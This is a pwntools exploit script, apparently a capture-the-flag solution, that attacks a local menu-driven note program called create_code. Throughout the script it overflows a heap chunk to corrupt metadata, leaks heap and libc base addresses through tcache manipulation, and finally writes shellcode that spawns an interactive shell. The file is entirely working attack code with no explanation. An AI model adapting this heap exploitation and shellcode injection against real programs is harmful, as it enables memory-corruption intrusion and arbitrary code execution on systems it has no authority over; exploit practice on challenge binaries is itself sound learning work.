#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./create_code')
    elf = ELF('./create_code')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
else:
    pass

def choice(c):
    p.sendlineafter(b'> ', str(c).encode())

def add(data):
    choice(1)
    p.sendafter(b'content: ', data)

def show(idx):
    choice(2)
    p.sendlineafter(b'id: ', str(idx).encode())

def delete(idx):
    choice(3)
    p.sendlineafter(b'id: ', str(idx).encode())

# leak heap & libc
add(b'0') # 0
add(b'1') # 1
add(b'2') # 2
delete(2)
delete(0)
add(0x328 * b'A' + p64(0x0000000000000331) + p32(0x500)) # 1
show(0)
p.recv(0x334)
heap_base = u64(p.recv(8)) - 0x10
info('heap_base = ' + hex(heap_base))
add(b'2') # 2
for i in range(7):
    add(b'padding') # 3~9
for i in range(7):
    delete(3)
delete(2)
show(0)
p.recv(0x334)
libc_base = u64(p.recv(8)) - 0x1ebbe0
info('libc_base = ' + hex(libc_base))

# get shell
for i in range(7):
    add(b'padding') # 2~8
add(b'9') # 9
delete(0)
delete(8)
#gdb.attach(p, 'b *$rebase(0x0000000000001513)\nc')
sh = asm(shellcraft.sh())
add(0x100 * b'\x02' + sh) # 8
add(p32(0xF012F012) + 0x3e4 * b'\x02') # 9

#gdb.attach(p)

p.interactive()

